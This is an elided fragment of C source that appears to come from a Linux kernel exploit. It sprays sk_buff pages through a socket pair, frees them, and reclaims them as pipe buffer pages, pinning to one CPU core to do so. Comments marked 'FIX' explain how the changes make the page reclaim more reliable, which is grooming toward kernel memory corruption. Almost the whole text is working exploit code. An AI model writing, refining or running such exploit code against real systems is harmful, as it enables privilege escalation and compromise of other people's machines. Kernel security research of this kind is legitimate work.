...
uintptr_t prepare_pipe_buffer_page_child(void) {
 ...
 for (size_t i = 0; i < pre.mm_cnt; i++) {
     if (pre.childs[i] > 0) waitpid(pre.childs[i], NULL, 0);
 }
 for (size_t i = 0; i < post.mm_cnt; i++) {
     if (post.childs[i] > 0) waitpid(post.childs[i], NULL, 0);
 }
 for (size_t i = 0; i < spray.mm_cnt; i++) {
     if (spray.childs[i] > 0) waitpid(spray.childs[i], NULL, 0);
 }
 for (size_t i = 0; i < prep.mm_cnt; i++) {
     if (prep.childs[i] > 0) waitpid(prep.childs[i], NULL, 0);
 }
 ...
 int skbbuf = 16 * 1024 * 1024;
 if (setsockopt(skb_sv[0], SOL_SOCKET, SO_SNDBUF, &skbbuf, sizeof(skbbuf)) < 0) {
 pr_info("setsockopt SO_SNDBUF failed, continuing\n");
 }
 if (setsockopt(skb_sv[1], SOL_SOCKET, SO_RCVBUF, &skbbuf, sizeof(skbbuf)) < 0) {
 pr_info("setsockopt SO_RCVBUF failed, continuing\n");
 }

 for (int spray_round = 0; spray_round < 64; spray_round++) {
 ssize_t sent = sendmsg(skb_sv[0], &msg, MSG_DONTWAIT);
 if (sent < 0) {
 if (errno == EAGAIN || errno == EWOULDBLOCK) {
 pr_info("skb spray saturated after %d rounds\n", spray_round);
 break;
 }
 SYSCHK(sent);
 }
 ...
 /* FIX: Allocate ALL pipe metadata BEFORE freeing sk_buff pages.
 * The original code allocated reclaim pipe metadata AFTER close(skb_sv),
 * which caused kmalloc() to steal freed sk_buff pages from the
 * per-CPU page lists before they could be reused for pipe data pages. */
...
int prepare_p0_pipe_oracle(void) {
 ...
 /* FIX: Pin parent to same core as child so pipe data page allocations
 * come from the same per-CPU list where sk_buff pages were freed. */
 pin_to_core(CORE);
